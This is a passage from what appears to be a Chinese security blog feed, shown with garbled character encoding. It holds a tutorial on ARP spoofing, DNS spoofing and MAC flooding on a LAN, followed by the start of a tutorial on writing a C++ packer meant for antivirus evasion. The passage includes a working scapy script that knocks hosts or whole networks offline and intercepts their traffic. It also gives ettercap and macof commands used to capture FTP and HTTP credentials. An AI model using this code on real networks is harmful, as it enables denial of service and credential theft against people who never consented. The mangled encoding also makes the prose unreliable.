class="line">getmacbyip(&#39;ip)         &#x2F;&#x2F;è·å¾—æŸIPçš„macåœ°å€</span><br><span class="line">srp(....)               &#x2F;&#x2F;å‘ç¬¬äºŒå±‚åŒ…å¹¶è¿”ç­‰å¾…å›åº”ï¼Œè¿”å›å€¼çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›åº”åŒ…ä½“ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯æœªå›åº”åŒ…ä½“</span><br><span class="line"></span><br><span class="line">sendp(Ether(src&#x3D;a,dst&#x3D;b)&#x2F;ARP(hwsrc&#x3D;c,psrc&#x3D;d,pdst&#x3D;e,op&#x3D;f))</span><br><span class="line">&#x2F;&#x2F;è¿™æ˜¯arpå‘åŒ…çš„æ„é€  sendpæ˜¯å‘ç¬¬äºŒå±‚æ•°æ®åŒ…å¹¶ä¸ç­‰å¾…å›åŒ… Etheræ˜¯æ„é€ åŒ…ä½“çš„æ„æ€</span><br><span class="line">&#x2F;&#x2F;aä¸ºè‡ªå·±çš„macåœ°å€ bä¸ºç›®æ ‡æœºå™¨çš„macåœ°å€ï¼Œ</span><br><span class="line">&#x2F;&#x2F;cä¸ºå‘åŒ…çš„æ¥æºmacï¼Œdä¸ºå‘åŒ…çš„æ¥æºipï¼Œeæ˜¯ç›®æ ‡æœºå™¨çš„ipï¼Œfæ˜¯arpæ“ä½œç±»å‹å­—ç¬¦</span><br><span class="line">&#x2F;&#x2F;arpæ¬ºéª—çš„è¯ï¼ŒæŠŠdæ”¹æˆç½‘å…³IPå³å¯</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šå«–çš„ipï¼Œmacæ‰«ææ¨¡å—ï¼Œè¿™ä¸€æ­¥ä¹Ÿå¯ä»¥æ‰‹åŠ¨è·å–</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">#im_scan(&#39;192.168.1.1&#x2F;24&#39;),mac ipåœ°å€æ‰«æå‡½æ•°</span><br><span class="line">def im_scan(ipduan):</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬ä»…èƒ½æ–­ç½‘å—·,å¯ä»¥å¯¹å•ä¸ªæœºå™¨æ–­ç½‘ï¼Œä¹Ÿå¯ä»¥æ–­æ•´ä¸ªå±€åŸŸç½‘çš„ç½‘</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def im_scan(ipduan):#æ‰«æ</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br><span class="line">            </span><br><span class="line">def arp_spoof(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    if tgt_ip:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,pdst&#x3D;tgt_ip,op&#x3D;2))</span><br><span class="line">    else:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line">def arp_gate(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    while 1:</span><br><span class="line">        sendp(Ether(dst&#x3D;gateway_mac,src&#x3D;mmac)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;tgt_ip,pdst&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    ipduan&#x3D;&#39;192.168.0.0&#x2F;24&#39;</span><br><span class="line">    tgt_ip&#x3D;&#39;192.168.0.104&#39; #è¦æ‰“æ•´ä¸ªå±€åŸŸç½‘å°±åˆ«è®¾ç½®è¿™ä¸ªï¼Œè¦æˆªè·å¤–ç•Œå‘å¾€æœºå™¨çš„æ•°æ®è¿™ä¸ªä¹Ÿå¿…é¡»è®¾ç½®</span><br><span class="line">    gateway_ip&#x3D;&#39;192.168.0.1&#39;</span><br><span class="line">    iface&#x3D;&#39;WLAN&#39;</span><br><span class="line">    threads_num&#x3D;20</span><br><span class="line">    print(&quot;å¦‚æœæƒ³ææ•´ä¸ªå±€åŸŸç½‘å°±åˆ«è®¾ç½®tgt_ip,è¦æˆªè·å¤–ç•Œå‘å¾€æœºå™¨çš„æ•°æ®è¿™ä¸ªå¿…é¡»è®¾ç½®&quot;)</span><br><span class="line">    so_scan&#x3D;input(&quot;[+]è¦æ‰«æå±€åŸŸç½‘å­˜æ´»ä¸»æœºå’Œå®ƒçš„macå—[Y&#x2F;N]&quot;)</span><br><span class="line">    if so_scan&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">        im_scan(ipduan)</span><br><span class="line">    else:</span><br><span class="line">        so_judge&#x3D;input(&quot;[+]ä½ æ˜¯æƒ³è®©æœºå™¨çš„å‘é€çš„æ•°æ®è¢«ä½ æˆªè·Yï¼Œè¿˜æ˜¯å¤–ç•Œå‘é€ç»™æœºå™¨çš„æ•°æ®è¢«ä½ æˆªè·N[Y&#x2F;N]&quot;)</span><br><span class="line">        if so_judge&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">            try:</span><br><span class="line">                print(&#39;å¼€å§‹æˆªèƒ¡æœºå™¨å‘é€å¾€å¤–ç•Œçš„æ•°æ®&#39;)</span><br><span class="line">                time.sleep(3)</span><br><span class="line">                for i in range(threads_num):</span><br><span class="line">                    t1&#x3D;threading.Thread(target&#x3D;arp_spoof,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                    t1.start()</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">        else:</span><br><span class="line">            if tgt_ip:</span><br><span class="line">                try:</span><br><span class="line">                    print(&#39;å¼€å§‹æˆªèƒ¡å¤–ç•Œå‘å¾€æœºå™¨çš„æ•°æ®&#39;)</span><br><span class="line">                    time.sleep(3)</span><br><span class="line">                    for i in range(threads_num):</span><br><span class="line">                        t2&#x3D;threading.Thread(target&#x3D;arp_gate,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                        t2.start()</span><br><span class="line">                except KeyboardInterrupt:</span><br><span class="line">                    print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;è¯·è®¾ç½®tgt_ip&#39;)</span><br></pre></td></tr></table></figure><p>å¹¿æ’­æ¬ºéª—ï¼Œå—å®³æœºä¸Šçš„æŠ“åŒ…æ•ˆæœ 3cé‚£ä¸ªæ˜¯æˆ‘çš„macåœ°å€<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145053.png" alt="QQæˆªå›¾20210219145053"></p><h1 id="DNSæ¬ºéª—"><a href="#DNSæ¬ºéª—" class="headerlink" title="DNSæ¬ºéª—"></a>DNSæ¬ºéª—</h1><h2 id="dnså·¥ä½œåŸç†"><a href="#dnså·¥ä½œåŸç†" class="headerlink" title="dnså·¥ä½œåŸç†"></a>dnså·¥ä½œåŸç†</h2><p>dnsï¼ˆåŸŸåç³»ç»Ÿï¼‰å°†åŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„ï¼Œdnsåè®®å³åŸŸåè§£æåè®®ï¼Œç”¨æ¥å°†ç”¨æˆ·è¾“å…¥çš„åŸŸåè§£æä¸ºIPã€‚<br>å…·ä½“ä¸€ç‚¹ï¼Œå½“ç”¨æˆ·è®¿é—®æŸä¸ªåŸŸåå¦‚<a href="http://www.baidu.com/">www.baidu.com</a>æ—¶ï¼Œ é¦–å…ˆå‘æœ¬åœ°dnså‘å‡ºè¯·æ±‚<br>è‹¥æœ¬åœ°dnsç¼“å­˜è¡¨æ— è¯¥åŸŸåIPæ˜ å°„å…³ç³»ï¼Œå°±ä¼šå‘æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨è¿”å›comåŸŸæœåŠ¡å™¨åœ°å€ç»™æœ¬åœ°dnsæœåŠ¡å™¨<br>æœ¬åœ°dnsæœåŠ¡å™¨å‘comåŸŸæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼ŒcomåŸŸæœåŠ¡å™¨è¿”å›baidu.comåŸŸæœåŠ¡å™¨ç»™æœ¬åœ°dnsæœåŠ¡å™¨<br>æœ¬åœ°dnsæœåŠ¡å™¨å‘baidu.comåŸŸæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼Œbaidu.comåŸŸæœåŠ¡å™¨è¿”å›<a href="http://www.baidu.com/">www.baidu.com</a>åœ°å€</p><h2 id="DNSæ¬ºéª—åŸç†"><a href="#DNSæ¬ºéª—åŸç†" class="headerlink" title="DNSæ¬ºéª—åŸç†"></a>DNSæ¬ºéª—åŸç†</h2><p>åœ¨arpæ¬ºéª—åè·å–åˆ°äº†å—å®³æœºå‘èµ·çš„dnsè¯·æ±‚åŒ…ï¼Œç„¶åè¿”å›ä¸€ä¸ªè‡ªå·±æ„é€ çš„dnså“åº”åŒ…ï¼Œä¼ªé€ è‡ªå·±æƒ³è¦çš„ipåŸŸåæ˜ å°„å…³ç³»ã€‚<br>å› ä¸ºDNSæ¬ºéª—æ˜¯å»ºç«‹åœ¨arpæ¬ºéª—åŸºç¡€ä¸Šï¼Œarpæ¬ºéª—åˆå¿…é¡»åœ¨å±€åŸŸç½‘è¿›è¡Œï¼Œæ•…DNSæ¬ºéª—ä¹Ÿåªèƒ½åœ¨å±€åŸŸç½‘è¿›è¡Œ</p><h2 id="DNSæ¬ºéª—å·¥å…·å®ç°"><a href="#DNSæ¬ºéª—å·¥å…·å®ç°" class="headerlink" title="DNSæ¬ºéª—å·¥å…·å®ç°"></a>DNSæ¬ºéª—å·¥å…·å®ç°</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145146.png" alt="QQæˆªå›¾20210219145146"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ettercap -T -q -P dns_spoof -M arp:remote &#x2F;å—å®³è€…IP&#x2F;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145220.png" alt="QQæˆªå›¾20210219145220"></p><h1 id="macæ³›æ´ªæ”»å‡»"><a href="#macæ³›æ´ªæ”»å‡»" class="headerlink" title="macæ³›æ´ªæ”»å‡»"></a>macæ³›æ´ªæ”»å‡»</h1><h2 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº:"></a>äº¤æ¢æœº:</h2><p>äº¤æ¢æœºï¼Œåªèƒ½åšæœ‰çº¿é“¾æ¥ï¼Œæ‰€ä»¥æ‹¿è¿™ä¸ªæ˜¯ä¸èƒ½ç”¨ä½œwifiçš„ã€‚<br>äº¤æ¢æœºçš„ä½œç”¨æ˜¯è½¬å‘å±€åŸŸç½‘å†…ä¸¤å°æœºå™¨ä¹‹é—´çš„äº’ç›¸çš„è¯·æ±‚ï¼ˆæœ‰çº¿è¿æ¥çš„æœºå™¨ï¼‰ã€‚</p><p>äº¤æ¢æœºå…·ä½“ä¼ è¾“æ•°æ®å¸§çš„è¿‡ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å‡è®¾ä¸»æœºAç¬¬ä¸€æ¬¡å‘ä¸»æœºBå‘é€æ•°æ®</span><br><span class="line">ä¸»æœºAå‘äº¤æ¢æœºå‘èµ·ä¸€ä¸ªæºmacåœ°å€ä¸ºè‡ªå·±ï¼Œç›®æ ‡macåœ°å€ä¸ºä¸»æœºBçš„æ•°æ®å¸§</span><br><span class="line">äº¤æ¢æœºæ”¶åˆ°åï¼Œå°†æºmacåœ°å€å’Œå…¶å¯¹åº”æ¥å£è®°å½•åˆ°macåœ°å€è¡¨ä¸­ï¼ˆmacåœ°å€è¡¨ä¸arpç¼“å­˜è¡¨æœ‰åŒºåˆ«ï¼‰</span><br><span class="line">äº¤æ¢æœºåœ¨è‡ªå·±çš„macåœ°å€è¡¨ä¸­æ£€æŸ¥æ˜¯å¦æœ‰ç›®æ ‡macçš„ä¿¡æ¯ï¼Œå¦‚æœæœ‰åˆ™å‘ç›®æ ‡macæ¥å£è½¬å‘æ•°æ®å¸§ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ä¼šå‘æ‰€ä»¥éæ•°æ®æ¥æºæ¥å£çš„æ¥å£å¹¿æ’­è¯¥æ•°æ®å¸§ï¼ˆmacæ³›æ´ªæ”»å‡»åŸç†ï¼‰</span><br><span class="line">å±€åŸŸç½‘å†…ä¸»æœºéƒ½æ”¶åˆ°äº†æ­¤æ•°æ®å¸§ï¼Œä½†åªæœ‰ä¸»æœºBä¼šå“åº”è¯¥æ•°æ®å¸§å¹¶ä¸”å›åº”ï¼Œå›åº”ä¿¡æ¯é‡Œæ³¨æ˜ä¸»æœºBçš„macåœ°å€ä»¥ä¾¿è®°å½•åˆ°macåœ°å€è¡¨ï¼Œå…¶ä»–ä¸»æœºéƒ½ä¸ä¼šæœ‰ååº”ã€‚</span><br><span class="line">äº¤æ¢æœºæ¥æ”¶åˆ°ä¸»æœºBçš„å›åº”åï¼Œä¼šè®°å½•å…¶mac æ¥å£çš„æ˜ å°„å…³ç³»ï¼Œä»¥åABé€šä¿¡æ—¶ä¼šè°ƒç”¨macåœ°å€è¡¨ä¸­çš„è®°å½•ï¼Œå®ç°å•æ’­</span><br></pre></td></tr></table></figure><h2 id="macè¡¨ä¸arpç¼“å­˜è¡¨çš„åŒºåˆ«"><a href="#macè¡¨ä¸arpç¼“å­˜è¡¨çš„åŒºåˆ«" class="headerlink" title="macè¡¨ä¸arpç¼“å­˜è¡¨çš„åŒºåˆ«"></a>macè¡¨ä¸arpç¼“å­˜è¡¨çš„åŒºåˆ«</h2><p>macè¡¨è®°å½•åœ¨äº¤æ¢æœºä¸­ï¼Œç”¨äºè®°å½•æ¥å£ macåœ°å€çš„å¯¹åº”å…³ç³»<br>arpç¼“å­˜è¡¨è®°å½•åœ¨æœ¬æœºä¸­ï¼Œç”¨äºè®°å½•IP macåœ°å€çš„å¯¹åº”å…³ç³»</p><h2 id="äº¤æ¢æœºmacè¡¨çš„å­¦ä¹ æœºåˆ¶ï¼š"><a href="#äº¤æ¢æœºmacè¡¨çš„å­¦ä¹ æœºåˆ¶ï¼š" class="headerlink" title="äº¤æ¢æœºmacè¡¨çš„å­¦ä¹ æœºåˆ¶ï¼š"></a>äº¤æ¢æœºmacè¡¨çš„å­¦ä¹ æœºåˆ¶ï¼š</h2><p>macè¡¨ä¸€èˆ¬éƒ½æ˜¯æœ‰å¤§å°é™åˆ¶çš„ï¼Œä¸€æ—¦macè¡¨æ»¡äº†ï¼Œå…¶ä»–macåœ°å€å°±åŠ ä¸è¿›æ¥äº†ã€‚<br>ä¸€æ—¦å…¶ä»–macåœ°å€åŠ ä¸è¿›æ¥äº†ï¼Œé‚£ä¹ˆmacè¡¨å°±æ— æ³•è¿›ä¸€æ­¥å­¦ä¹ ï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«å¹¿æ’­åˆ°å±€åŸŸç½‘ï¼Œå®ç°æ³›æ´ªã€‚<br>macè¡¨æ˜¯æœ‰è€åŒ–æœºåˆ¶çš„ï¼Œè‹¥äº¤æ¢æœºä¸æŸå°ä¸»æœºé•¿æ—¶é—´æœªé€šä¿¡ï¼Œäº¤æ¢æœºå°±ä¼šæŠŠè¯¥ä¸»æœºçš„macåœ°å€åˆ é™¤ï¼Œç­‰ä¸‹ä¸€æ¬¡é€šä¿¡æ—¶å†å­¦ä¹ ã€‚</p><h2 id="æ³›æ´ªæ”»å‡»åŸç†ï¼š"><a href="#æ³›æ´ªæ”»å‡»åŸç†ï¼š" class="headerlink" title="æ³›æ´ªæ”»å‡»åŸç†ï¼š"></a>æ³›æ´ªæ”»å‡»åŸç†ï¼š</h2><p>æ³›æ´ªæ”»å‡»çš„ç›®çš„æ˜¯è·å–ä¸»æœºä¹‹é—´çš„é€šä¿¡æ•°æ®ï¼Œè¦è¾¾åˆ°è¿™ä¸ªç›®çš„åˆ™éœ€è¦å¼ºè¿«äº¤æ¢æœºæŠŠæ¥æ”¶åˆ°çš„æ•°æ®å¸§ç»Ÿç»Ÿå¹¿æ’­å‡ºæ¥ã€‚æ³›æ´ªæ”»å‡»åŸç†åˆ™æ˜¯å‘äº¤æ¢æœºå‘é€å¤§é‡æœªçŸ¥macåœ°å€è®©äº¤æ¢æœºä¸åœå­¦ä¹ ï¼ŒæŠŠmacè¡¨å……æ»¡ï¼Œè¿™æ ·æ­£å¸¸ä¸»æœºmacåœ°å€è€åŒ–åå°±æ— æ³•å†æ·»åŠ åˆ°macåœ°å€è¡¨ä¸­ï¼Œä»¥åçš„æ‰€æœ‰é€šä¿¡æ•°æ®éƒ½ä¼šè¢«å¹¿æ’­å‡ºæ¥</p><h2 id="ä½¿ç”¨kaliä¸Šçš„macofæ¥è¿›è¡Œæ³›æ´ªæ”»å‡»"><a href="#ä½¿ç”¨kaliä¸Šçš„macofæ¥è¿›è¡Œæ³›æ´ªæ”»å‡»" class="headerlink" title="ä½¿ç”¨kaliä¸Šçš„macofæ¥è¿›è¡Œæ³›æ´ªæ”»å‡»"></a>ä½¿ç”¨kaliä¸Šçš„macofæ¥è¿›è¡Œæ³›æ´ªæ”»å‡»</h2><p>ç›®å‰æœ‰ä¸‰å°æœºå™¨<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145424.png" alt="QQæˆªå›¾20210219145424"><br>æˆ‘ä»¬è¯•ç€æˆªè·ç‰©ç†æœºç™»å½•ftpæœåŠ¡å™¨æ—¶çš„è´¦æˆ·ä¸å¯†ç <br>å…ˆä½¿ç”¨å‘½ä»¤macofï¼Œè®©äº¤æ¢æœºçš„macè¡¨è¢«å æ»¡<br>ä»…è¾“å…¥macofå³å¯<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145448.png" alt="QQæˆªå›¾20210219145448"><br>è¾“å…¥tcpdump -nn -X -i eth0 tcp port 21å¼€å§‹æŠ“åŒ…ï¼ˆå»ºè®®ä¸ç”¨wiresharkï¼Œæ˜¯å› ä¸ºåŒä¸€æ—¶é—´macofå‘½ä»¤å‘å‡ºçš„æ•°æ®åŒ…å¤ªå¤šäº†ï¼Œç”¨wiresharkä¼šå·¨å¡ï¼‰<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145510.png" alt="QQæˆªå›¾20210219145510"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png" alt="QQæˆªå›¾20210219145527"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png"></p><p>ä¸‹é¢æ˜¯æŠ“httpåŒ…</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145603.png" alt="QQæˆªå›¾20210219145603"></p><h2 id="macæ³›æ´ªæ”»å‡»çš„å±€é™æ€§"><a href="#macæ³›æ´ªæ”»å‡»çš„å±€é™æ€§" class="headerlink" title="macæ³›æ´ªæ”»å‡»çš„å±€é™æ€§:"></a>macæ³›æ´ªæ”»å‡»çš„å±€é™æ€§:</h2><p>åªèƒ½åœ¨å±€åŸŸç½‘å†…æ”»å‡»å¦ä¸€ä¸ªå±€åŸŸç½‘å†…æœºå™¨.<br>ä¸”æ”»å‡»ç›®æ ‡å¿…é¡»å’Œè‡ªå·±ç”¨äº¤æ¢æœºæœ‰çº¿è¿æ¥èµ·æ¥<br>ä¹Ÿå°±æ˜¯è¯´ä½ çš„ç”µè„‘å‘èµ·macæ³›æ´ªæ˜¯æ”»å‡»ä¸åˆ°ä½ çš„æ‰‹æœºçš„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;arpåè®®ä¸æ¬ºéª—&quot;&gt;&lt;a href=&quot;#arpåè®®ä¸æ¬ºéª—&quot; class=&quot;headerlink&quot; title=&quot;arpåè®®ä¸æ¬ºéª—&quot;&gt;&lt;/a&gt;arpåè®®ä¸æ¬ºéª—&lt;/h1&gt;&lt;h2 id=&quot;ç®€å•æ¦‚è¦ï¼š&quot;&gt;&lt;a href=&quot;#ç®€å•æ¦‚è¦ï¼š&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>ä»0å¼€å§‹ç”¨C++å†™ä¸€ä¸ªåŠ å£³å™¨</title>
    <link href="http://const27.com/2021/06/28/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C++%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/"/>
    <id>http://const27.com/2021/06/28/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C++%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/</id>
    <published>2021-06-28T13:51:48.301Z</published>
    <updated>2021-09-03T13:17:26.978Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒ:<a href="https://blog.csdn.net/qq_31507523/article/details/89438410">https://blog.csdn.net/qq_31507523/article/details/89438410</a></p><p>å­¦ä¹ ä¸€ä¸‹å†™å£³ï¼Œåœ¨ä»¥åå…æ€ä¸­ä½¿ç”¨ã€‚</p><h2 id="åŠ å£³åŸç†"><a href="#åŠ å£³åŸç†" class="headerlink" title="åŠ å£³åŸç†"></a>åŠ å£³åŸç†</h2><h3 id="æ‰‹å·¥åŠ å£³"><a href="#æ‰‹å·¥åŠ å£³" class="headerlink" title="æ‰‹å·¥åŠ å£³"></a>æ‰‹å·¥åŠ å£³</h3><p>ç”¨010editoræ‰‹å·¥åŠ å£³äº†è§£ä¸€æ³¢åŸç†ã€‚åŠ å£³åŸç†å¤§è‡´å¦‚ä¸‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144840.png" alt="QQæˆªå›¾20210217144840"></p><p>å³æˆ‘ä»¬å‘PEæ–‡ä»¶æ·»åŠ ä¸€ä¸ªåŒºæ®µå¹¶å°†å…¶è®¾ç½®ä¸ºå…¥å£ç‚¹ï¼Œè¿™æ ·PEæ–‡ä»¶æœ€å¼€å§‹æ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯æˆ‘ä»¬æ·»åŠ çš„åŒºæ®µä¹Ÿå°±æ˜¯å£³çš„æŒ‡ä»¤ï¼Œå£³å¯¹åŠ å¯†åŒºè¿›è¡Œè§£å¯†ï¼Œå¯¹å‹ç¼©åŒºè¿›è¡Œè§£å‹ï¼Œå°†åŸæœ¬çš„EXEæ–‡ä»¶è¿˜åŸå‡ºæ¥ï¼Œç„¶åè·³è½¬è‡³åŸç¨‹åºå…¥å£ï¼Œç¨‹åºç…§å¸¸è¿è¡Œã€‚</p><p>é¦–å…ˆç”Ÿæˆä¸€ä¸ªæ‰“å°helloçš„exeæ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">printf(&quot;hello&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›®å‰è¦å¹²çš„äº‹æƒ…æ˜¯:ä»¥æ‰‹åŠ¨çš„å½¢å¼å‘PEæ–‡ä»¶æ·»åŠ ä¸€ä¸ªå£³éƒ¨åˆ†å¹¶è®¾ä¸ºç¨‹åºå…¥å£ï¼Œå¹¶ä½¿å…¶èƒ½è·³è½¬å›åŸå…¥å£ã€‚<br>é‚£å°±æ¥å§</p><p>ç”¨010editoræ‰“å¼€æˆ‘ä»¬çš„exeæ–‡ä»¶ï¼Œå¯ç”¨exeæ¨¡æ¿åˆ†æã€‚<br>æˆ‘ä»¬é¦–å…ˆä¿®æ”¹å…¶æ–‡ä»¶å¤´numverofsectionå±æ€§ï¼Œè¿™ä¸ªå±æ€§ç”¨æ¥å®šä¹‰å½“å‰PEæ–‡ä»¶å­˜åœ¨å¤šå°‘ä¸ªåŒºæ®µ,å› ä¸ºæˆ‘ä»¬è¦æ·»åŠ ä¸€ä¸ªå£³åŒºæ®µï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶åŠ 1å˜æˆ6</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144857.png" alt="QQæˆªå›¾20210217144857"></p><p>åœ¨æˆ‘ä»¬é‡è½½æ¨¡æ¿åæˆ‘ä»¬å°±ä¼šåœ¨åŒºæ®µè¡¨å‘ç°å¤šå‡ºæ¥ä¸€ä¸ªç©ºçš„åŒºæ®µè¡¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144908.png" alt="QQæˆªå›¾20210217144908"></p><p>ä»ä¸Šåˆ°ä¸‹å„ä¸ªæ¯”è¾ƒé‡è¦å­—æ®µçš„æ„æ€æ˜¯<br>\1. Name è¡¨ç¤ºè¯¥åŒºæ®µçš„åå­—<br>2.VirtualSize è¡¨ç¤ºåœ¨å†…å­˜ä¸­çš„å¤§å°(ä¸€èˆ¬å†…å­˜å¯¹é½ä¸º0x1000)<br>3.virtualaddress è™šæ‹Ÿåœ°å€ å³ä¸Šä¸€ä¸ªåŒºæ®µçš„VirtualAddress + ä¸Šä¸€ä¸ªåŒºæ®µç»å†…å­˜å¯¹é½ç²’åº¦å¯¹é½åçš„å¤§å°<br>4.sizeofdata è¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­çš„å¤§å°ï¼ˆä¸€èˆ¬æ–‡ä»¶å¯¹é½ä¸º0x200)<br>5.pointertorawdata æ–‡ä»¶çš„åç§» å³ ä¸Šä¸€ä¸ªåŒºæ®µçš„PointerToRawData + ä¸Šä¸€ä¸ªåŒºæ®µçš„SizeOfRawData</p><p>ç„¶åæˆ‘ä»¬é€šè¿‡ä¿®æ”¹ä»¥ä¸Šå„å€¼æ¥å®šä¹‰ä¸€ä¸ªæ–°åŒºæ®µï¼ˆå£³åŒºæ®µ)çš„å±æ€§</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144928.png" alt="QQæˆªå›¾20210217144928"></p><p>è¿™é‡Œçš„virtualsizeçœ‹ç€å¡«ä¸€ä¸ªå°±è¡Œäº†ã€‚<br>æ­¤æ—¶æˆ‘ä»¬åªæ˜¯å®šä¹‰äº†åŒºæ®µè¡¨ï¼Œä½†æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰è¯¥åŒºæ®µå­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åˆ›å»ºè¯¥åŒºæ®µã€‚<br>ç„¶åè¿˜è¦è®©åŒºæ®µå¯ç¼–è¾‘ï¼ŒæŠŠä¸‹åˆ—å€¼æ”¹ä¸º1å³å¯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144950.png" alt="QQæˆªå›¾20210217144950"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145000.png" alt="QQæˆªå›¾20210217145000"></p><p>ctrl+shift+i å‘ç›®æ 